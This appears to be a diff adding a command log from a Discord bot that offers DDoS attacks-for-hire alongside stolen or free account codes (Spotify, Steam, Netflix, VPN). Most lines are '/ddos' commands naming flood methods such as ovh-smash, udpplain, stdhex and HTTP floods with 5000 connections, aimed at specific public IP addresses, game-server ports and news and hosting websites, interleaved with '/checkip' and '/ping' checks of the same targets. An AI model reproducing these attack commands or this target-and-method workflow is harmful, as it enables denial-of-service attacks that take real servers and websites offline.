@@ -1,0 +1,450 @@
+/accounts
+/spotify
+/spotify
+/spotify
+/spotify
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/vpn
+/commands
+/spotify
+/spotify
+/steamcode
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/VPN
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/ddos ovh 192.223.30.30 50 dport= 30120
+/tr4p
+/sms
+/ddos udp 192.223.30.30 50 dport=30120
+/steam
+/spotify
+/steam
+/ping 192.223.30.30
+/hitlist
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/botcommands
+/methods
+/ddos 54.37.244.19 ovh-smash 120
+/ddos ovh smash 54.37.244.19 120
+/ddos ovh-smash 54.37.244.19 120
+/ddos ovh-smash 54.37.244.19 120 dport=32048
+/ping 54.37.244.19
+/methods
+/ddos udp 54.37.244.19 120 dport=30120
+/ping 54.37.244.19
+/iplookup 54.39.130.197
+/checkip 54.39.130.197
+/checkip 134.255.217.27
+/ddos udp 134.255.217.27 120 dport=30106
+/ping 134.255.217.27
+/methods
+/checkip 185.249.196.162
+/checkip
+/checkip 45.13.58.186
+/ddos udp 45.13.58.186 120 dport=30120
+/checkip
+/checkip 66.70.181.200
+/checkip 185.150.25.154
+/ddos udp 185.150.25.154 120 dport=30120
+/ping 185.150.25.154
+/ping 185.150.25.154
+/checkip 51.79.18.127
+/checkip 104.161.92.29
+/ddos udp 104.161.92.29 120 dport=30120
+/ping 104.161.92.29
+/ddos udp 79.161.169.186 20
+/ping 79.161.169.186
+/ddos udp 79.161.169.186 30 dport=3074
+/ddos std 79.161.169.186 30
+/ddos std 79.161.169.186 50 dport=53
+/checkip 147.135.105.13
+/ddos 147.135.105.13 ovh-smash 120 dport=30120
+/ddos ovh-smash 147.135.105.13 120 dport=30120
+/ddos ovh-smash 147.135.105.13 120 dport=30120
+/ddos ovh-smash 147.135.105.13 120 dport=30120
+/ddos std 79.161.169.186 120 dport=3074
+/METHODS
+/ddos stdhex 79.161.169.186 120
+/ddos nfo-down 147.135.105.13 120
+/ddos udp 147.135.105.13 120 dport=30120
+/ddos ovh-down 147.135.105.13 120 dport=30120
+/ddos ovh-down 147.135.105.13 120 dport=30120
+/methodss
+/methods
+/ddos 147.135.105.13 ovh-smash 120 dport=30120
+/ddos ovh-smash 147.135.105.13 120 dport=30120
+/ddos nfo-down 147.135.105.13 120 dport=30120
+/ddos udp 147.135.105.13 120 dport=30120
+/ddos udpplain 147.135.105.13 120 dport=30120
+/ddos ovh-smash 147.135.105.13 120 dport=30120
+/ping 147.135.105.13
+/http https://www.dagbladet.no/ 120
+/ddos http https://www.dagbladet.no/ 120
+/methods
+/ddos htto https://www.dagbladet.no/ 120 conns=5000
+/ddos http https://www.dagbladet.no/ 120 conns=5000
+/checkip 51.161.32.167
+/ddos ovh-smash 51.161.32.167 120 dport=30120
+/ddos udp 51.161.32.167 120 dport=30120
+/checkip 91.121.66.65
+/checkip 51.195.143.123
+/ddos ovh-smash 51.195.143.123 120 dport=30120
+/ddos udp 103.214.109.42 120 dport=30120
+/ipchecker
+/checkip 103.214.109.42
+/methods
+/ddos std 103.214.109.42 120 dport=30120
+/checkip
+/checkip 77.99.41.54
+/ddos udp 77.99.41.54 120 dport=30120
+/ping 77.99.41.54
+/checkip 51.81.101.204
+/ddos ovh-smash 51.81.101.204 120 dport=30124
+/ddos udp 51.81.101.204 120 dport=30124
+/ipcheck 97.117.156.71
+/ipcheck 97.117.156.71
+/checkip 97.117.156.71
+/ddos udp 97.117.156.71 120 dport=30120
+/methods
+/ddos nfo-down 97.117.156.71 120 dport=30120
+/ddos tcp 97.117.156.71 120 dport=30120
+/checkip 51.81.65.98
+/ddos udp 51.81.65.98 120 dport=30135
+/ddos ovh-smash 51.81.65.98 120 dport=30135
+/checkip 104.161.92.22
+/ddos udp 104.161.92.22 120 dport=30120
+/ping 104.161.92.22
+/checkip 51.38.160.238
+/ddos ovh-smash 54.37.244.19 120 dport=21
+/ddos tcp 54.37.244.19 120 dport=21
+/methyods
+/methods
+/ddos udp 72.84.225.143 120
+/ddos udp 54.37.244.19 120
+/ddos ovh-smash 120
+/ddos ovh-smash 54.37.244.19 120
+/ddos ovh-smash 54.37.244.19 120 dport=30120
+/ddos ovh-smash 147.135.105.13 120 dport=30120
+/ddos udp 147.135.105.13 120 dport=30120
+/ddos ovh-smash 54.37.244.19 120
+/ddos ovh-smash 54.37.244.19 120 dport=32048
+/ddos udp 54.37.244.19 120 dport=32048
+/ddos udp 54.37.244.19 120
+/ddos udp 141.138.168.126
+/ddos udp 141.138.168.126 120
+/ping 50.88.113.186
+/ddos udp partridgegetslucky.com 120
+/ddos udp 208.113.196.223 120
+/ping 75.119.198.160
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/vpn
+/ddos ovh-smash 185.249.196.78 dport=30500 120
+/ddos udp 185.249.196.78 dport=30500 120
+/ddos udpplain 209.126.127.176 dport=30120 120
+/ping 209.126.127.176
+/ddos ovh-smash 51.222.10.58 dport=52779 120
+/ping  51.222.10.58
+/ddos ovh-method 51.222.10.58 dport=30169 120
+/ddos ovh-smash 51.222.10.58 dport=30169 120
+/ping 51.222.10.58
+/ddos ovh-smash 51.222.10.58 120 dport=30169
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/checkip 45.146.252.9
+/ping 45.146.252.9
+/ping 193.70.7.60
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 45.146.252.9
+/ping 193.70.7.60
+/ddos ovh-smash 31.214.243.53 120 dport=30120
+/ddos udpplain 31.214.243.53 120 dport=30120
+/ping31.214.243.53
+/ping 31.214.243.53
+/ping 31.214.243.53
+/ping 31.214.243.53
+/ping 31.214.243.53:30120
+/ddos 31.214.243.78 ovh-smash 120 dport=30120
+/ddos ovh-smash 31.214.243.78 120 dport=30120
+/ping 108.194.67.170
+/ddos ovh-smash 185.249.196.166 120 dport=30320
+/ddos udp 185.249.196.166 120 dport=30320
+/ddos udpplain 185.249.196.166 120 dport=30320
+/ping 185.249.196.166
+/methods
+/ddos nfo-down 185.249.196.166 120
+/ping 185.249.196.166
+/checkip 185.249.196.166
+/ddos ovh-smash 51.38.21.137 120 dport=30120
+/checkip 51.38.21.137
+/checkip 51.38.21.137
+/checkip 52.146.49.226
+/ddos udp 185.249.196.77 120 dport=61321
+/checkip 185.249.196.77
+/ddos std 0.0.0.1 1
+/ddos udp 24.105.53.208 120 dport=41500
+/ddos udp 24.105.53.208 120 dport=41500
+/methods
+/ddos udp https://theuselessweb.com/ 120
+/ddos udp theuselessweb.com
+/ddos udp iamawesome 120
+/ddos iamawesome.com 120
+/ddos udp iamawesome.com 120
+/ddos udp corgiorgy.com 120
+/ddos udp 3.234.7.100 120
+/ddos udp 138.68.199.111 120
+/ddos udp randomcolour.com 120
+/ping 40.119.48.86
+/ddos udp thesongthatdefinesyourlife.com 120
+/ddos udp plspetdoge.com 120
+/checkip plspetdoge.com
+/checkip 45.33.109.169
+/ddos udp 208.113.163.92 120
+/ping 208.113.163.92
+/methods
+/ddos http 208.113.163.92 120 conns=5000
+/ping 208.113.163.92
+/ping 208.113.163.92
+/ddos http 208.113.163.92 120 domian=208.113.163.92 conns=5000
+/ddos http 208.113.163.92 120 domian=wutdafuk.com conns=5000
+/checkip 73.73.73.73
+/methods
+/ddos http 138.68.199.111 120 http://www.yesnoif.com/ conns=5000
+/ping 138.68.199.111
+/ddos http 138.68.199.111 200 www.yesnoif.com conns=5000
+/checkip 138.68.199.111
+/ddos http 138.68.199.111 200 80 conns=5000
+/ping 138.68.199.111
+/ddos http 138.68.199.111 200 www.yesnoif.com conns=5000
+/ddos http 138.68.199.111 120 http://www.yesnoif.com/ conns=5000
+/ping 138.68.199.111
+/ddos http 165.227.29.75 120 domain=https://crouton.net/
+/ddos http 165.227.29.75 120 domain=https://crouton.net/ conns=5000
+/ddos http 165.227.29.75 120 domain=https://crouton.net/ conns=5000
+/ddos http 165.227.29.75 120 domain=crouton.net conns=5000
+/ddos udp 192.168.56.1 120 dport=8089
+/ping 192.168.56.1
+/ddos udp 185.249.196.140 120 dport=30120
+/ping 185.249.196.140
+/ping 185.249.196.140
+/methods
+/methods
+/ddos http 95.143.172.171 300 http://pixelsfighting.com/ conns=5000
+/ddos http 95.143.172.171 300 domain=http://pixelsfighting.com/ conns=5000
+/ddos http 95.143.172.171 300 domain=pixelsfighting.com conns=5000
+/ddos http 141.138.168.126 200 domain=http://lacquerlacquer.com/ conns=5000
+/ddos http 141.138.168.126 200 domain=lacquerlacquer.com conns=5000
+/ddos udp 141.138.168.126 200
+/ddos http 141.138.168.126 200 conns=5000
+/ddos http 192.254.185.197 200 domain=isitwhite.com conns=5000
+/checkip 51.210.121.135
+/ddos http 172.104.22.242 120 domain=tencents.info conns=5000
+/checkip 172.104.22.242
+/ddos http 172.104.22.242 120 domain=linode.com conns=5000
+/ddos http 172.104.22.242 120 linode.com conns=5000
+/ddos http 192.186.254.167 120 domain=onemillionlols.com conns=5000
+/ping 192.186.254.167
+/checkip 192.186.254.167
+/ddos http 192.186.254.167 120 domain=https://godaddy.com/ conns=5000
+/ddos http 192.186.254.167 120 domain=godaddy.com conns=5000
+/ddos http 192.186.254.167 120 domain=http://onemillionlols.com/ conns=5000
+/ddos http 208.109.192.70 120 domain=godaddy.com
+/ddos http 208.109.192.70 120 domain=https://no.godaddy.com/
+/ddos http 69.163.162.136 120 domain=http://unicodesnowmanforyou.com/ conns=5000
+/ddos stdhex 69.163.162.136 120
+/ddos stdhex 69.163.162.136 120 dport=http://unicodesnowmanforyou.com/
+/ping 69.163.162.136
+/ddos stdhex 35.223.253.215 120 dport=http://chihuahuaspin.com/
+/checkip 52.146.60.219
+/ping 52.146.60.219
+/info
+/getplan
+/methods
+/getplan
+/getplan <@710436291744890891>
+/checkip 5.254.79.130
+/ddos udp 5.254.79.130 300
+/ping 5.254.79.130
+/ping 5.254.79.130
+/ddos udp 46.28.51.243 200 dport=43230
+/ddos udpplain 46.28.51.243 200 dport=43230
+/ddos udpplain 46.28.51.243 200 dport=43230
+/ddos udpplain 46.28.51.243 1000 dport=43230
+/ddos udp 173.244.199.142 400 dport=38060
+/ddos udpplain 173.244.199.142 400 dport=38060
+/ddos stdhex 79.161.169.186 400 port=3074
+/ddos stdhex 79.161.169.186 400 dport=3074
+/methods
+/ddos stdhex 79.161.169.186 200 dport=3074
+/ddos stdhex 79.161.169.186 400 dport=3074
+/ddos dup 79.161.169.186 400 dport=3074
+/ddos udp 79.161.169.186 400 dport=3074
+/ddos stdhex 79.161.169.186 400 dport=3074
+/checkip 161.97.72.214
+/ddos 3.230.37.190 200 dport=443
+/ddos udp 3.230.37.190 200 dport=443
+/tr4p
+/lag 79.161.169.186
+/methods
+/ddos stdhex 79.161.169.186 400 dport=3074
+/ddos std 79.161.169.186 400 dport=3074
+/ping 79.161.169.186
+/lag
+/lag stdhex 79.161.169.186 300 2 dport=3074
+/ddos ovh-smash 147.135.105.13 400 dport=30120
+/ddos nfo-down 147.135.105.13 120 dport=30120
+/methods
+/ddos udpplain 147.135.105.13 120 dport=30120
+/ddos udp 147.135.105.13 60 dport=30120
+/ddos stdhex 147.135.105.13 60 dport=30120
+/checkip 46.212.156.229
+/prices
+/price
+/getplan <@710436291744890891>
+/ddos stdhex 172.83.43.139 400
+/checkip 172.83.43.139
+/checkip 172.83.43.139
+/getplan <@710436291744890891>
+/checkip 144.217.11.179
+/checkip 144.217.11.179
+/checkip 139.99.245.162
+/ddos udp 188.127.241.196 400 dport=7791
+/ddos udpplain 188.127.241.196 120 dport=7791
+/ping 188.127.241.196
+/ddos udpplain 188.127.241.196 250 dport=7791
+/methods
+/ddos udpplain 109.195.250.100 120 dport=7785
+/ddos udp 95.217.192.91 200 dport=7797
+/ddos udplain 95.217.192.91 120 dport=7797
+/ddos udpplain 95.217.192.91 120 dport=7797
+/getplan <@710436291744890891>
+/ddos ovh-smash 54.37.244.19 400 dport=32048
+/getplan <@!710436291744890891>
+/ddos udp 88.214.59.31 120 dport=30830
+/checkip 88.214.59.31
+/ddos udpplain 88.214.59.31 30 dport=30830
+/methods
+/ddos tcp 88.214.59.31 30 dport=30830
+/ping 88.214.59.31
+/ddos udp 1.1.1.1 30
+/ddos udp 89.11.205.165 30
+/ddos udp 89.11.205.165
+/ddos stdhex 89.11.205.165 60 dport=80
+/ddos udp 147.135.105.13 120
+/ddos udp 147.135.105.13 120 dport=30120
+/ddos 147.135.105.13 120
+/ddos 147.135.105.13 udp 12+
+/ddos 147.135.105.13 udp 120
+/netflix
+/accounts
+/steamcode
+/steamcode
+/steam
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/steamcode
+/SPOTIFY
+/spotify
+/accounts
+[Wed Aug 12 2020 10:37:25 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:38:04 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:38:15 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:14 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:18 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:22 GMT-1100 (Samoa Standard Time)] /vbpn
+[Wed Aug 12 2020 10:40:24 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:29 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:34 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:37 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:41 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:49 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:40:57 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:41:02 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:41:05 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:41:08 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:41:17 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:41:35 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:41:40 GMT-1100 (Samoa Standard Time)] /vpn
+[Wed Aug 12 2020 10:41:43 GMT-1100 (Samoa Standard Time)] /vpn
